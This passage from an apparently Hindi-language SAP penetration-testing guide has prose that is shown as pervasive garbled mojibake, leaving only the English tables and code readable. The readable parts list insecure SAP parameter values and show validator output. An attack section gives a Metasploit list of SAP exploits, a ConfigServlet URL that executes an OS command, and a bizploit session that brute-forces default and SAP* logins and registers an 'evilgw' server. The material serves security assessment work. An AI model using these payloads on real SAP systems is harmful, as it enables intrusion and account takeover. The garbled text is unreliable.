рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ <i>gw/reg_no_conn_info</i> 255 рд╕реЗ рдХрдо (`<255`) рдкрд░ рд╕реЗрдЯ рд╣реИ, рддреЛ рдЗрд╕реЗ рдЦрддрд░реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдирд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕реА рддрд░рд╣, рдпрджрд┐ <i>icm/security_log</i> рджреЛ (`2`) рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИ, рддреЛ рдпрд╣ рднреА рдПрдХ рд╕рдВрднрд╛рд╡рд┐рдд рдЦрддрд░рд╛ рд╣реЛрдЧрд╛ред

| Parameter                                      | Constraint  | Description                                    |
|------------------------------------------------|-------------|------------------------------------------------|
| `auth/object_disabling_active`                 | `Y`         | рдпрд╣ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдСрдмреНрдЬреЗрдХреНрдЯ рдбрд┐рд╕реЗрдмрд▓рд┐рдВрдЧ рд╕рдХреНрд░рд┐рдп рд╣реИред       |
| `auth/rfc_authority_check`                     | `<2`        | RFCs рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЬрд╛рдВрдЪ рд╕реНрддрд░ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред       |
| `auth/no_check_in_some_cases`                  | `Y`         | рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред |
| `bdc/bdel_auth_check`                         | `FALSE`     | рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ BDC рдореЗрдВ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЬрд╛рдВрдЪ рд▓рд╛рдЧреВ рдХреА рдЧрдИ рд╣реИ рдпрд╛ рдирд╣реАрдВред |
| `gw/reg_no_conn_info`                         | `<255`      | рдкрдВрдЬреАрдХрд░рдг рд╕рдВрдЦреНрдпрд╛ рдХрдиреЗрдХреНрд╢рди рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд╡рд░реНрдгреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред |
| `icm/security_log`                            | `2`         | ICM (Internet Communication Manager) рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд╛ рд▓реЙрдЧ рд╕реНрддрд░ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред |
| `icm/server_port_0`                           | `Display`   | ICM (рдкреЛрд░реНрдЯ 0) рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд░ рдкреЛрд░реНрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред    |
| `icm/server_port_1`                           | `Display`   | ICM (рдкреЛрд░реНрдЯ 1) рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд░ рдкреЛрд░реНрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред    |
| `icm/server_port_2`                           | `Display`   | ICM (рдкреЛрд░реНрдЯ 2) рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд░ рдкреЛрд░реНрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред    |
| `login/password_compliance_to_current_policy`  | `0`         | рд╡рд░реНрддрдорд╛рди рдиреАрддрд┐ рдХреЗ рд╕рд╛рде рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрдкрд╛рд▓рди рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИред |
| `login/no_automatic_user_sapstar`              | `0`         | рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ SAPSTAR рдЕрд╕рд╛рдЗрдирдореЗрдВрдЯ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рддрд╛ рд╣реИред   |
| `login/min_password_specials`                  | `0`         | рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгреЛрдВ рдХреА рдиреНрдпреВрдирддрдо рд╕рдВрдЦреНрдпрд╛ред |
| `login/min_password_lng`                       | `<8`        | рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдиреНрдпреВрдирддрдо рд▓рдВрдмрд╛рдИред        |
| `login/min_password_lowercase`                 | `0`         | рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдЫреЛрдЯреЗ рдЕрдХреНрд╖рд░реЛрдВ рдХреА рдиреНрдпреВрдирддрдо рд╕рдВрдЦреНрдпрд╛ред |
| `login/min_password_uppercase`                 | `0`         | рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдмрдбрд╝реЗ рдЕрдХреНрд╖рд░реЛрдВ рдХреА рдиреНрдпреВрдирддрдо рд╕рдВрдЦреНрдпрд╛ред |
| `login/min_password_digits`                    | `0`         | рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдЕрдВрдХреЛрдВ рдХреА рдиреНрдпреВрдирддрдо рд╕рдВрдЦреНрдпрд╛ред |
| `login/min_password_letters`                   | `1`         | рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдЕрдХреНрд╖рд░реЛрдВ рдХреА рдиреНрдпреВрдирддрдо рд╕рдВрдЦреНрдпрд╛ред |
| `login/fails_to_user_lock`                     | `<5`        | рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреЛ рд▓реЙрдХ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЕрд╕рдлрд▓ рд▓реЙрдЧрд┐рди рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ред |
| `login/password_expiration_time`               | `>90`       | рдкрд╛рд╕рд╡рд░реНрдб рд╕рдорд╛рдкреНрддрд┐ рд╕рдордп рджрд┐рди рдореЗрдВред             |
| `login/password_max_idle_initial`              | `<14`       | рдкрд╛рд╕рд╡рд░реНрдб рдлрд┐рд░ рд╕реЗ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╕реЗ рдкрд╣рд▓реЗ рдЕрдзрд┐рдХрддрдо рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╕рдордп (рдкреНрд░рд╛рд░рдВрднрд┐рдХ) рдорд┐рдирдЯреЛрдВ рдореЗрдВред |
| `login/password_max_idle_productive`           | `<180`      | рдкрд╛рд╕рд╡рд░реНрдб рдлрд┐рд░ рд╕реЗ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╕реЗ рдкрд╣рд▓реЗ рдЕрдзрд┐рдХрддрдо рдирд┐рд╖реНрдХреНрд░рд┐рдп рд╕рдордп (рдЙрддреНрдкрд╛рджрдХ) рдорд┐рдирдЯреЛрдВ рдореЗрдВред |
| `login/password_downwards_compatibility`       | `0`         | рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓рд┐рдП рдбрд╛рдЙрдирд╡рд░реНрдб рд╕рдВрдЧрддрддрд╛ рд╕рдХреНрд╖рдо рд╣реИред |
| `rfc/reject_expired_passwd`                    | `0`         | рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ RFC (Remote Function Calls) рдХреЗ рд▓рд┐рдП рд╕рдорд╛рдкреНрдд рдкрд╛рд╕рд╡рд░реНрдб рдЕрд╕реНрд╡реАрдХреГрдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред |
| `rsau/enable`                                 | `0`         | RS AU (Authorization) рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдпрд╛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рддрд╛ рд╣реИред |
| `rdisp/gui_auto_logout`                       | `<5`        | GUI рд╕рддреНрд░реЛрдВ рдХреЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд▓реЙрдЧрдЖрдЙрдЯ рд╕реЗ рдкрд╣рд▓реЗ рдХрд╛ рд╕рдордп рдорд┐рдирдЯреЛрдВ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред |
| `service/protectedwebmethods`                  | `SDEFAULT`  | рд╕рдВрд░рдХреНрд╖рд┐рдд рд╡реЗрдм рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред |
| `snc/enable`                                  | `0`         | рд╕реБрд░рдХреНрд╖рд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрдЪрд╛рд░ (SNC) рдХреЛ рд╕рдХреНрд╖рдо рдпрд╛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рддрд╛ рд╣реИред |
| `ucon/rfc/active`                             | `0`         | UCON (Unified Connectivity) RFCs рдХреЛ рд╕рдХреНрд░рд┐рдп рдпрд╛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рддрд╛ рд╣реИред |

## Script for Parameter Checking

рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреЗ рдХрд╛рд░рдг, рд╕рднреА рдХреЛ .XML рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ [SAPPV (SAP Parameter Validator)](https://github.com/damianStrojek/SAPPV) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛, рдЬреЛ рдЙрдкрд░реЛрдХреНрдд рд╕рднреА рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрдЪрд┐рдд рднрд┐рдиреНрдирддрд╛ рдХреЗ рд╕рд╛рде рдорд╛рди рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛ред
```
./SAPPV.sh EXPORT.XML

Parameter: auth/no_check_in_some_cases
User-Defined Value: No data
System Default Value: Y
Comment: Activation of the Profile Generator
Vulnerability: "SAP Parameter Misconfiguration: auth/no_check_in_some_cases"

Parameter: auth/object_disabling_active
User-Defined Value: N
System Default Value: N
Comment: Value 'N' prohibits disabling of authorization objects
Vulnerability: "SAP Parameter Misconfiguration: auth/object_disabling_active"

Parameter: auth/rfc_authority_check
User-Defined Value: 6
System Default Value: 6
Comment: Execution option for the RFC authority check
Vulnerability: "SAP Parameter Misconfiguration: auth/rfc_authority_check"

Parameter: bdc/bdel_auth_check
User-Defined Value: No data
System Default Value: FALSE
Comment: batch-input: check authorisation for activity DELE when delete TA
Vulnerability: "SAP Parameter Misconfiguration: bdc/bdel_auth_check"

[...]
```
# Attack!

* рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдкреБрд░рд╛рдиреЗ рд╕рд░реНрд╡рд░реЛрдВ рдпрд╛ рддрдХрдиреАрдХреЛрдВ рдЬреИрд╕реЗ Windows 2000 рдкрд░ рдЪрд▓рддреА рд╣реИред
* рд╕рдВрднрд╛рд╡рд┐рдд рд╢реЛрд╖рдгреЛрдВ / рд╣рдорд▓реЛрдВ рдХреА рдпреЛрдЬрдирд╛ рдмрдирд╛рдПрдВ, SAP рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рд╛рд░реЗ Metasploit рдореЙрдбреНрдпреВрд▓ рд╣реИрдВ \(auxiliary modules\) рдФрд░ рд╢реЛрд╖рдг:
```text
msf > search sap
Matching Modules
================
Name                                                                     Disclosure Date  Rank       Description
----                                                                     ---------------  ----       -----------
auxiliary/admin/maxdb/maxdb_cons_exec                                    2008-01-09       normal     SAP MaxDB cons.exe Remote Command Injection
auxiliary/admin/sap/sap_configservlet_exec_noauth                        2012-11-01       normal     SAP ConfigServlet OS Command Execution
auxiliary/admin/sap/sap_mgmt_con_osexec                                                   normal     SAP Management Console OSExecute
auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                            normal     SAP SOAP EPS_DELETE_FILE File Deletion
auxiliary/dos/windows/http/pi3web_isapi                                  2008-11-13       normal     Pi3Web ISAPI DoS
auxiliary/dos/windows/llmnr/ms11_030_dnsapi                              2011-04-12       normal     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS
auxiliary/scanner/http/sap_businessobjects_user_brute                                     normal     SAP BusinessObjects User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_brute_web                                 normal     SAP BusinessObjects Web User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_enum                                      normal     SAP BusinessObjects User Enumeration
auxiliary/scanner/http/sap_businessobjects_version_enum                                   normal     SAP BusinessObjects Version Detection
auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt                                    normal     SAP CTC Service Verb Tampering User Management
auxiliary/scanner/sap/sap_hostctrl_getcomputersystem                                      normal     SAP Host Agent Information Disclosure
auxiliary/scanner/sap/sap_icf_public_info                                                 normal     SAP ICF /sap/public/info Service Sensitive Information Gathering
auxiliary/scanner/sap/sap_icm_urlscan                                                     normal     SAP URL Scanner
auxiliary/scanner/sap/sap_mgmt_con_abaplog                                                normal     SAP Management Console ABAP Syslog Disclosure
auxiliary/scanner/sap/sap_mgmt_con_brute_login                                            normal     SAP Management Console Brute Force
auxiliary/scanner/sap/sap_mgmt_con_extractusers                                           normal     SAP Management Console Extract Users
auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints                                        normal     SAP Management Console Get Access Points
auxiliary/scanner/sap/sap_mgmt_con_getenv                                                 normal     SAP Management Console getEnvironment
auxiliary/scanner/sap/sap_mgmt_con_getlogfiles                                            normal     SAP Management Console Get Logfile
auxiliary/scanner/sap/sap_mgmt_con_getprocesslist                                         normal     SAP Management Console GetProcessList
auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter                                    normal     SAP Management Console Get Process Parameters
auxiliary/scanner/sap/sap_mgmt_con_instanceproperties                                     normal     SAP Management Console Instance Properties
auxiliary/scanner/sap/sap_mgmt_con_listlogfiles                                           normal     SAP Management Console List Logfiles
auxiliary/scanner/sap/sap_mgmt_con_startprofile                                           normal     SAP Management Console getStartProfile
auxiliary/scanner/sap/sap_mgmt_con_version                                                normal     SAP Management Console Version Detection
auxiliary/scanner/sap/sap_router_info_request                                             normal     SAPRouter Admin Request
auxiliary/scanner/sap/sap_router_portscanner                                              normal     SAPRouter Port Scanner
auxiliary/scanner/sap/sap_service_discovery                                               normal     SAP Service Discovery
auxiliary/scanner/sap/sap_smb_relay                                                       normal     SAP SMB Relay Abuse
auxiliary/scanner/sap/sap_soap_bapi_user_create1                                          normal     SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_brute_login                                            normal     SAP SOAP Service RFC_PING Login Brute Forcer
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec                   normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec                               normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                              normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                            normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
auxiliary/scanner/sap/sap_soap_rfc_ping                                                   normal     SAP /sap/bc/soap/rfc SOAP Service RFC_PING Function Service Discovery
auxiliary/scanner/sap/sap_soap_rfc_read_table                                             normal     SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data
auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                           normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface                                normal     SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec                                  normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution
auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec                                      normal     SAP SOAP RFC SXPG_COMMAND_EXECUTE
auxiliary/scanner/sap/sap_soap_rfc_system_info                                            normal     SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering
auxiliary/scanner/sap/sap_soap_th_saprel_disclosure                                       normal     SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure
auxiliary/scanner/sap/sap_web_gui_brute_login                                             normal     SAP Web GUI Login Brute Forcer
exploit/multi/sap/sap_mgmt_con_osexec_payload                            2011-03-08       excellent  SAP Management Console OSExecute Payload Execution
exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                     2013-03-26       great      SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                         2012-05-08       great      SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
exploit/windows/browser/enjoysapgui_comp_download                        2009-04-15       excellent  EnjoySAP SAP GUI ActiveX Control Arbitrary File Download
exploit/windows/browser/enjoysapgui_preparetoposthtml                    2007-07-05       normal     EnjoySAP SAP GUI ActiveX Control Buffer Overflow
exploit/windows/browser/sapgui_saveviewtosessionfile                     2009-03-31       normal     SAP AG SAPgui EAI WebViewer3D Buffer Overflow
exploit/windows/http/sap_configservlet_exec_noauth                       2012-11-01       great      SAP ConfigServlet Remote Code Execution
exploit/windows/http/sap_host_control_cmd_exec                           2012-08-14       average    SAP NetWeaver HostControl Command Injection
exploit/windows/http/sapdb_webtools                                      2007-07-05       great      SAP DB 7.4 WebTools Buffer Overflow
exploit/windows/lpd/saplpd                                               2008-02-04       good       SAP SAPLPD 6.28 Buffer Overflow
exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow
```
* рдХреБрдЫ рдЬреНрдЮрд╛рдд exploits рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ \(Exploit-DB рджреЗрдЦреЗрдВ\) рдпрд╛ рдРрд╕реЗ рд╣рдорд▓реЗ рдЬреИрд╕реЗ рдкреБрд░рд╛рдиреЗ рд▓реЗрдХрд┐рди рдЕрдЪреНрдЫреЗ тАЬSAP ConfigServlet Remote Code ExecutionтАЭ рдХреЛ SAP Portal рдореЗрдВ:
```text
http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
```
![SAP Config Servlet RCE](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap_rce.jpeg)

* `start` рдХрдорд╛рдВрдб рдХреЛ Discovery рдЪрд░рдг рдореЗрдВ bizploit рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкрд░ рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдЖрдк рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдЖрдХрд▓рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рднреА рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ:
```text
bizploit> plugins
bizploit/plugins> vulnassess all
bizploit/plugins> vulnassess config bruteLogin
bizploit/plugins/vulnassess/config:bruteLogin> set type defaultUsers
bizploit/plugins/vulnassess/config:bruteLogin> set tryHardcodedSAPStar True
bizploit/plugins/vulnassess/config:bruteLogin> set tryUserAsPwd True
bizploit/plugins/vulnassess/config:bruteLogin> back
bizploit/plugins> vulnassess config registerExtServer
bizploit/plugins/vulnassess/config:registerExtServer> set tpname evilgw
bizploit/plugins/vulnassess/config:registerExtServer> back
bizploit/plugins> vulnassess config checkRFCPrivs
bizploit/plugins/vulnassess/config:checkRFCPrivs> set checkExtOSCommands True
bizploit/plugins/vulnassess/config:checkRFCPrivs> back
bizploit/plugins> vulnassess config icmAdmin
bizploit/plugins/vulnassess/config:icmAdmin> set adminURL /sap/admin
bizploit/plugins/vulnassess/config:icmAdmin> back
bizploit/plugins> start
bizploit/plugins> back
bizploit> start
```
# рдЕрдиреНрдп рдЙрдкрдпреЛрдЧреА рдЙрдкрдХрд░рдг рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП

* [PowerSAP](https://github.com/airbus-seclab/powersap) - SAP рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛ рдЖрдХрд▓рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреЙрд╡рд░рд╢реЗрд▓ рдЙрдкрдХрд░рдг
* [Burp Suite](https://portswigger.net/burp) - рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдлрдЬрд╝рд┐рдВрдЧ рдФрд░ рд╡реЗрдм рд╕реБрд░рдХреНрд╖рд╛ рдЖрдХрд▓рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЖрд╡рд╢реНрдпрдХ рдЙрдкрдХрд░рдг
* [pysap](https://github.com/SecureAuthCorp/pysap) - SAP рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкреИрдХреЗрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдп
* [https://github.com/gelim/nmap-erpscan](https://github.com/gelim/nmap-erpscan) - SAP/ERP рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ nmap рдХреА рдорджрдж рдХрд░реЗрдВ

## рд╕рдВрджрд░реНрдн

* [SAP Penetration Testing Using Metasploit](http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf)
* [https://github.com/davehardy20/SAP-Stuff](https://github.com/davehardy20/SAP-Stuff) - Bizploit рдХреЛ рдЕрд░реНрдз-рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ
* [SAP NetWeaver ABAP рд╕реБрд░рдХреНрд╖рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рднрд╛рдЧ 3: рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ рдкрд╣реБрдБрдЪ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб](https://erpscan.com/press-center/blog/sap-netweaver-abap-security-configuration-part-2-default-passwords-for-access-to-the-application/)
* [SAP рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд ABAP-рд▓реЗрдирджреЗрди рдХреЛрдбреЛрдВ рдХреА рд╕реВрдЪреА](https://wiki.scn.sap.com/wiki/display/Security/List+of+ABAP-transaction+codes+related+to+SAP+security)
* [SAP рдкреЛрд░реНрдЯрд▓ рдХреЛ рддреЛрдбрд╝рдирд╛](https://erpscan.com/wp-content/uploads/presentations/2012-HackerHalted-Breaking-SAP-Portal.pdf)
* [SAP рдХреА 10 рд╕рдмрд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рдФрд░ рд╣рдорд▓реЗ](https://erpscan.com/wp-content/uploads/presentations/2012-Kuwait-InfoSecurity-Top-10-most-interesting-vulnerabilities-and-attacks-in-SAP.pdf)
* [рдмрд┐рдЬрд╝рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде SAP рдкрд╛рд░рд┐рд╕реНрдерд┐рддрд┐рдХреА рддрдВрддреНрд░ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛ рдЖрдХрд▓рди: рдЦреЛрдЬ](https://www.onapsis.com/blog/assessing-security-sap-ecosystems-bizploit-discovery)
* [https://www.exploit-db.com/docs/43859](https://www.exploit-db.com/docs/43859)
* [https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/](https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/)
* [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред**

</details>
{% endhint %}
